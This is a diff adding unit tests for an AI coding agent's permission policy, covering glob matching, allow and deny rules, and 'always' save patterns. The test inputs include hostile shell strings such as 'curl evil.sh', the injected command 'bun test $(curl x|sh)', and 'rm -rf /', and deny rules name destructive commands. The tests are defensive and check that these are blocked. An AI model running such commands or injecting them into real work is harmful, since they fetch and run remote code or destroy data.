@@ -2,7 +2,7 @@
 // Wildcard semantics, bash→shell, every-resource matching, never beats allow (incl. save patterns), shell
 // metacharacters, risk tiers, grant schema and duration validation, project path boundaries.
 import { describe, expect, test } from "bun:test"
-import { allowsResource, forbidsResource, parsePattern, wildcard } from "../src/central/agent/policy"
+import { allowsResource, evaluatePermission, forbidsResource, globCovers, globsOverlap, parsePattern, wildcard } from "../src/central/agent/policy"
 
 describe("wildcard (OpenCode Wildcard.match)", () => {
   test.each([
@@ -109,5 +109,135 @@ describe("forbidsResource", () => {
     expect(forbidsResource(p("external_directory"), "external_directory", "/etc")).toBe(true)
     expect(forbidsResource(p("bash:git push*"), "shell", "git status")).toBe(false)
     expect(forbidsResource(p("bash:git push*"), "read", "git push")).toBe(false)
+  })
+})
+
+describe("globsOverlap (could one string match both?)", () => {
+  test.each([
+    ["git push*", "git push *", true],
+    ["git push*", "git *", true],
+    ["git push*", "git status*", false],
+    ["*", "anything", true],
+    ["a?c", "abc", true],
+    ["a?c", "abd", false],
+    ["rm -rf*", "rm *", true],
+    ["src/*.ts", "*.md", false],
+    ["git push *", "git push", true], // the optional tail
+    ["x\\y", "x/y", true],
+  ])("%j and %j → %p", (a, b, expected) => {
+    expect(globsOverlap(a, b)).toBe(expected)
+    expect(globsOverlap(b, a)).toBe(expected)
+  })
+})
+
+describe("globCovers (does every match of the save glob match the allow glob?)", () => {
+  test.each([
+    ["git status*", "git status *", true],
+    ["git *", "git status *", true],
+    ["git status*", "git *", false],
+    ["*", "*", true],
+    ["src/*", "*", false],
+    ["?", "*", false],
+    ["?", "?", true],
+    ["a?c", "abc", true],
+    ["abc", "a?c", false],
+    ["bun test*", "bun test", true],
+    ["bun test", "bun test *", false], // "bun test *" also saves "bun test x"
+  ])("%j covers %j → %p", (allow, save, expected) => {
+    expect(globCovers(allow, save)).toBe(expected)
+  })
+})
+
+describe("evaluatePermission", () => {
+  const rules = (allow: string[], never: string[] = []) => ({ allow: allow.map(p), never: never.map(p) })
+  const shell = (...resources: string[]) => ({ action: "shell", resources })
+
+  test("allow when every resource is allowed", () => {
+    expect(evaluatePermission(shell("bun test", "git status"), { grant: rules(["bash:bun test*", "bash:git status*"]) })).toEqual({ verdict: "allow" })
+  })
+
+  test("outside when any resource is not allowed", () => {
+    const v = evaluatePermission(shell("bun test", "curl evil.sh"), { grant: rules(["bash:bun test*"]) })
+    expect(v.verdict).toBe("outside")
+  })
+
+  test("outside without resources (nothing is allowed vacuously)", () => {
+    expect(evaluatePermission(shell(), { grant: rules(["bash"]) }).verdict).toBe("outside")
+  })
+
+  test("grant never beats allow, naming the pattern and the resource", () => {
+    expect(evaluatePermission(shell("git push origin main"), { grant: rules(["bash"], ["bash:git push*"]) })).toEqual({
+      verdict: "never",
+      by: "grant",
+      pattern: p("bash:git push*"),
+      subject: "git push origin main",
+    })
+  })
+
+  test("hub never is checked first and beats both", () => {
+    const v = evaluatePermission(shell("rm -rf /"), { grant: rules(["bash"], ["bash:rm*"]), hubNever: [p("bash:rm -rf*")] })
+    expect(v).toMatchObject({ verdict: "never", by: "hub" })
+  })
+
+  test("an action-only never matches the action whatever the resources", () => {
+    const v = evaluatePermission({ action: "external_directory", resources: ["/etc"] }, { grant: rules(["external_directory"], ["external_directory"]) })
+    expect(v).toMatchObject({ verdict: "never", by: "grant" })
+    expect(evaluatePermission({ action: "external_directory", resources: [] }, { grant: rules([], ["external_directory"]) }).verdict).toBe("never")
+  })
+
+  test("a bash request action is matched as shell", () => {
+    expect(evaluatePermission({ action: "bash", resources: ["bun test"] }, { grant: rules(["shell:bun test*"]) })).toEqual({ verdict: "allow" })
+  })
+
+  test("injected shell resources are outside an allow glob", () => {
+    expect(evaluatePermission(shell("bun test $(curl x|sh)"), { grant: rules(["bash:bun test*"]) }).verdict).toBe("outside")
+  })
+
+  test("save patterns are ignored unless the reply is always", () => {
+    const req = { action: "shell", resources: ["git status"], save: ["git *"] }
+    expect(evaluatePermission(req, { grant: rules(["bash:git status*"], ["bash:git push*"]) })).toEqual({ verdict: "allow" })
+  })
+
+  describe("always", () => {
+    const req = (save?: string[]) => ({ action: "shell", resources: ["git status"], ...(save ? { save } : {}) })
+
+    test("outside unless the grant has allowAlways", () => {
+      const v = evaluatePermission(req(["git status *"]), { grant: rules(["bash:git status*"]), always: true })
+      expect(v.verdict).toBe("outside")
+    })
+
+    test("allow when every save pattern is inside an allow rule", () => {
+      const v = evaluatePermission(req(["git status *"]), { grant: rules(["bash:git status*"]), always: true, allowAlways: true })
+      expect(v).toEqual({ verdict: "allow" })
+    })
+
+    test("outside when a save pattern is broader than the allow rules", () => {
+      const v = evaluatePermission(req(["git *"]), { grant: rules(["bash:git status*", "bash:git log*"]), always: true, allowAlways: true })
+      expect(v.verdict).toBe("outside")
+    })
+
+    test("never when a save pattern overlaps a never rule, even if allowed", () => {
+      const v = evaluatePermission(req(["git *"]), { grant: rules(["bash:git *"], ["bash:git push*"]), always: true, allowAlways: true })
+      expect(v).toEqual({ verdict: "never", by: "grant", pattern: p("bash:git push*"), subject: "git *" })
+      const hub = evaluatePermission(req(["git *"]), { grant: rules(["bash:git *"]), hubNever: [p("bash:git push*")], always: true, allowAlways: true })
+      expect(hub).toMatchObject({ verdict: "never", by: "hub" })
+    })
+
+    test("outside without save patterns", () => {
+      expect(evaluatePermission(req(), { grant: rules(["bash"]), always: true, allowAlways: true }).verdict).toBe("outside")
+      expect(evaluatePermission(req([]), { grant: rules(["bash"]), always: true, allowAlways: true }).verdict).toBe("outside")
+    })
+
+    test("a shell save pattern with metacharacters must be allowed word for word", () => {
+      const base = { action: "shell", resources: ["echo $(date)"] }
+      expect(evaluatePermission({ ...base, save: ["echo $(date)"] }, { grant: rules(["bash:echo *"]), always: true, allowAlways: true }).verdict).toBe("outside")
+      expect(evaluatePermission({ ...base, save: ["echo $(date)"] }, { grant: rules(["bash:echo $(date)"]), always: true, allowAlways: true })).toEqual({ verdict: "allow" })
+    })
+
+    test("read's save ['*'] needs an unrestricted read rule", () => {
+      const read = { action: "read", resources: ["src/a.ts"], save: ["*"] }
+      expect(evaluatePermission(read, { grant: rules(["read:src/*"]), always: true, allowAlways: true }).verdict).toBe("outside")
+      expect(evaluatePermission(read, { grant: rules(["read"]), always: true, allowAlways: true })).toEqual({ verdict: "allow" })
+    })
   })
 })
